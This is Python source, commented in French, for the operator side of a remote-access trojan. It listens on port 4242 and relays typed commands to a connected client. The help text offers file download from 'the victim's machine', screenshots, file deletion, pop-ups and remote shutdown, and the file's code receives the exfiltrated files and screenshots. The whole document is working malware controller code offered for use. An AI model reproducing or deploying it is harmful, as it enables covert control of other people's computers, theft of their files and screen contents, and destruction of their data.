import socket
import sys
import tqdm
import time

buffersize = 1024

#Création du socket
def creation_du_socket():
	try:
		global host
		global port
		global s
		host = ""
		port = 4242
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	except socket.error as erreur:
		print("\nErreur de création du socket : " + str(erreur) + "\nNouvelle tentative...")
		time.sleep(1)

#Liaison du socket et écoute de connexions entrantes (listen permet de lier le client)
def liaison_du_socket():
	try:
		global host
		global port
		global s
		print(f"Ecoute sur le port {port}")

		s.bind((host, port))
		s.listen()

	except socket.error as erreur:
		print("\nErreur de liaison du socket : " + str(erreur) + "\nNouvelle tentative...")
		time.sleep(1)
		liaison_du_socket()

#Accepte la connexion
def acceptation_de_connexion():
	conn, addresse = s.accept()		# conn stoque les éléments permettant de communiquer, addresse stoque l'IP et le port du client
	print(f"Connexion établie ! IP : {addresse[0]} | PORT : {addresse[1]}")
	time.sleep(0.5)
	conn.send(bytes("cd .", "utf-8"))     # demand ele dossier courant du client
	reponse_bytes = conn.recv(10000000)
	reponse_str = reponse_bytes.decode("utf-8")
	print(reponse_str, end="")      # affiche le dossier courant du client
	envoi_de_commandes(conn)

#Envoie les commandes rentrées au client
def envoi_de_commandes(conn):
	while True:
		commande = input()
		if commande == "exit":			#Arrête liaison    
			conn.send(bytes(commande, "utf-8"))
			time.sleep(0.5)
			print("\nSession fermée\n")
			break

		elif commande == "help":
			print("\n\ncd : Change de dossier vers le dossier en question")
			print("\nls : Liste les fichiers et repertoires du répertoire courant")
			print("\ndownload : Télecharge le FICHIER en question")
			print("\nscreenshot : Prend une capture d'écran sur la machine de la victime")
			print("\ndelete : Supprime le fichier/dossier	 en question")
			print("\nmkdir : Crée le dossier en question")
			print("\npop : Crée un pop up (peut s'afficher derrière l'interpréteur)")
			print("\nshutdown : éteint l'ordinateur client")
			print("\nexit : Ferme la connexion en cours")
			print("\nstop : Ferme la connexion du côté CLIENT (en développement)\n")
			conn.send(bytes("cd .", "utf-8"))


		elif len(commande)>0:
			conn.send(bytes(commande, "utf-8"))     # peut-être à placer plus loin si latence qui fait buguer

			if commande[:8]=="download":
				
				try:
					filename = commande[9:]
					filesize = int(conn.recv(buffersize).decode())
					progress = tqdm.tqdm(range(filesize), f"Réception de {filename}", unit="B", unit_scale=True, unit_divisor=buffersize)    # barre de progression
					
					f = open(filename, "wb")    # crée le fichier sur notre ordi (serveur) et l'ouvre pour écrire dedans
					taille = 0	    #variable qui augmente au fur et à mesure que le fichier arrive
						
					while taille<filesize:    # écrit le fichier

						data = conn.recv(buffersize)    # reçoit le chunk de données
						f.write(data)       # écrit le chunk à la suite des précédents dans le fichier
						taille+=len(data)      # permet de suivre l'évolution du transfert (quand arréter la réception du fichier)
						progress.update(len(data))		# met à jour la barre de progression				
							
					
					f.close()       # ferme le fichier
					print(f"\nTéléchargement de {filename} terminé")

				except:
					print("\nFichier introuvable")
					conn.send(bytes("cd .", "utf-8"))

			elif commande[:10]=="screenshot":    
				try:
					screensize = int(conn.recv(buffersize).decode())
					screenshot = open("screenshot.png", "wb")
					taille = 0

					while taille<screensize:
						data = conn.recv(buffersize)    # reçoit le chunk de données
						
						screenshot.write(data)       # écrit le chunk à la suite des précédents dans le fichier
						taille+=len(data)
						

					screenshot.close()
					print("\nRéception de la capture d'écran terminée, elle est enregistrée dans votre dossier courant.")
				except:
					print(str(screensize))
					conn.send(bytes("cd .", "utf-8"))

			elif commande[:3]=="pop":
				titre=str(input("Titre à donner à la fenêtre : "))
				conn.send(bytes(titre, "utf-8"))
				message=str(input("Message à afficher : "))
				conn.send(bytes(message, "utf-8"))
				bouton=str(input("Message sur le bouton : "))
				conn.send(bytes(bouton, "utf-8"))

			elif commande[:4] == "stop":
				print("\nSession client fermée.")
				sys.exit()

								


		reponse_bytes = conn.recv(10000000)
		reponse_str = reponse_bytes.decode("utf-8")
		print(reponse_str, end="")



creation_du_socket()
liaison_du_socket()
acceptation_de_connexion()


